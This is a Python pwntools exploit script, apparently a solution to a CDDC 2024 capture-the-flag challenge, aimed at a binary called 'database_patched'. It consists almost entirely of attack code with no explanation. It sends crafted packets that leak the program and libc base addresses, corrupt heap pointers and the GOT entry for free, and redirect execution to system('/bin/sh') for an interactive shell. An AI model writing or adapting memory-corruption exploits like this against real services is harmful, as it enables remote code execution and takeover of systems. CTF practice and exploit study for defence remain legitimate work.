#!/usr/bin/python3

from pwn import *

exe = ELF('database_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: r.sendlineafter(msg, data)
sa = lambda msg, data: r.sendafter(msg, data)
sl = lambda data: r.sendline(data)
s = lambda data: r.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())


class queues:
    def __init__(self) -> None:
        self.size = 0
        self.data = b""
        
    def gen(self):
        return p16(self.size) + self.data
    
    
class packet:
    def __init__(self, option) -> None:
        self.option = option
        self.queue_num = 0
        self.queues_list = []
        
    def add_queue(self, size, data) -> None:
        queue = queues()
        queue.size = size
        queue.data = data.ljust(size, b'\x00')
        self.queues_list.append(queue)
    
    def get_queues_data(self):
        if (self.option == 2):
            return p32(self.option) + p32(len(self.queues_list))
        return p32(self.option) + p32(len(self.queues_list)) + b''.join([queue.gen() for queue in self.queues_list])

def GDB(bp):
    gdb.attach(r, gdbscript=bp)
    
def get_exe_base(pid):
    maps_file = f"/proc/{pid}/maps"
    exe_base = None

    with open(maps_file, 'r') as f:
        exe_base = int(f.readline().split('-')[0], 16)

    if exe_base is None:
        raise Exception("Executable base address not found.")
    
    return exe_base

if args.REMOTE:
    r = remote('cddc2024-qualifiers-nlb-231aa6753cb7a1e6.elb.ap-southeast-1.amazonaws.com', 18439)
    # r = remote('0', 18439)
    
else:
    r = process(exe.path)
    exe_base = get_exe_base(r.pid)
    bp = f'''
        b*{hex(exe_base+0x205F)}
        b*{hex(exe_base+0x1A10)}
        set $queues = {hex(exe_base+0x5100)}
        set $fqueues = {hex(exe_base+0x50A0)}
        set $mmap_addr = {hex(exe_base+0x5050)}
        c
    '''

pk = packet(1)
pk.add_queue(0xFF8, b'tmp')
r.send(pk.get_queues_data())

r.recv()
pk = packet(3)
pk.add_queue(8, p64(0))
r.send(pk.get_queues_data())

r.recv()
pk = packet(4)
pk.add_queue(8, p64(0))
pk.add_queue(0xff0, b'hello chino')
pk.add_queue(0xd, b'ne')
r.send(pk.get_queues_data())

r.recv()
pk = packet(1)
pk.add_queue(0xFF8, b'chino kafuu')
r.send(pk.get_queues_data())

r.recv()
pk = packet(4)
pk.add_queue(8, p64(0))
pk.add_queue(4, p32(0x1010))
pk.add_queue(3, b'\x00'*3)
r.send(pk.get_queues_data())

r.recv()
pk = packet(2)
r.send(pk.get_queues_data())
pk = packet(2)
r.send(pk.get_queues_data())

r.recvuntil(b'0028')
hex_leak = b'28' + r.recvline(False)
exe.address = u64(bytes.fromhex(hex_leak[:16].decode())) - 0x5028
mmap = u64(bytes.fromhex(hex_leak[16:32].decode()))

info("exe_base " + hex(exe.address))
info("mmap " + hex(mmap))


pk = packet(1)
pk.add_queue(0xFF8, b'tmp')
r.send(pk.get_queues_data())

r.recv()
pk = packet(1)
pk.add_queue(0xFF8, b'chino kafuu')
r.send(pk.get_queues_data())

r.recv()
pk = packet(5)
pk.add_queue(8, p64(0))
r.send(pk.get_queues_data())

r.recv()
pk = packet(3)
pk.add_queue(8, p64(0))
r.send(pk.get_queues_data())

r.recv()
pk = packet(3)
pk.add_queue(8, p64(0))
r.send(pk.get_queues_data())

r.recv()
pk = packet(4)
pk.add_queue(8, p64(0))
pk.add_queue(0xff0, b'hello chino')
pk.add_queue(0xd, b'ne')
r.send(pk.get_queues_data())

r.recv()
pk = packet(4)

pk.add_queue(8, p64(0))
payload = p64(0xff8) + p64(exe.got['free']-8)
pk.add_queue(len(payload), payload)
pk.add_queue(4, b'\x00'*4)
r.send(pk.get_queues_data())

pk = packet(2)
r.send(pk.get_queues_data())
pk = packet(2)
r.send(pk.get_queues_data())

r.recvuntil(b'20')
libc.address = u64(bytes.fromhex('20'+r.recvline(False).decode())) - libc.sym['free']
info("libc_base " + hex(libc.address))

pk = packet(1)
pk.add_queue(0xFF8, b'tmp')
r.send(pk.get_queues_data())

r.recv()
pk = packet(1)
pk.add_queue(0xFF8, b'chino kafuu')
r.send(pk.get_queues_data())

r.recv()
pk = packet(5)
pk.add_queue(8, p64(0))
r.send(pk.get_queues_data())

r.recv()
pk = packet(3)
pk.add_queue(8, p64(0))
r.send(pk.get_queues_data())

r.recv()
pk = packet(4)
pk.add_queue(8, p64(0))
pk.add_queue(0xff0, b'hello chino')
pk.add_queue(0xd, b'ne')
r.send(pk.get_queues_data())

r.recv()
pk = packet(4)
pk.add_queue(8, p64(0))
payload = p64(0xff8) + p64(mmap+0x48)
pk.add_queue(len(payload), payload)
pk.add_queue(4, b'\x00'*4)
r.send(pk.get_queues_data())

pk = packet(2)
r.send(pk.get_queues_data())
pk = packet(2)
r.send(pk.get_queues_data())

pk = packet(1)
payload = b'\x00'*0xff0 + p64(libc.sym['system'])
pk.add_queue(0xFF8, payload)
r.send(pk.get_queues_data())
r.recv()

pk = packet(1)
payload = b'\x00'*0xff0 + p64(exe.address+0x50a0)
pk.add_queue(0xFF8, payload)

r.send(pk.get_queues_data())
pk = packet(2)
r.send(pk.get_queues_data())
pk = packet(2)
r.send(pk.get_queues_data())
r.recvline()
# GDB(bp)

pk = packet(1)
pk.add_queue(0xd700, b'a')
r.send(pk.get_queues_data())

pk = packet(1)
payload = b'\x00'*0xff0 + p64(exe.address+0x50a0)
pk.add_queue(0xFF8, payload)
r.send(pk.get_queues_data())


pk = packet(3)
pk.add_queue(8, p64(0))
r.send(pk.get_queues_data())

r.recv()
pk = packet(5)
pk.add_queue(8, p64(0))
r.send(pk.get_queues_data())

pk = packet(4)
pk.add_queue(8, p64(1))

payload = p64(mmap+0x10c)[1:] + p64(next(libc.search(b'/bin/sh')))
payload = payload.ljust(0xcb, b'\x00') + p64(libc.sym['system'])*3
pk.add_queue(len(payload), payload)
pk.add_queue(0x1, b'\x00')
r.send(pk.get_queues_data())

pk = packet(4)
pk.add_queue(8, p64(1))
pk.add_queue(1, b'\x00')
pk.add_queue(1, b'\x00')
r.send(pk.get_queues_data())

r.interactive()
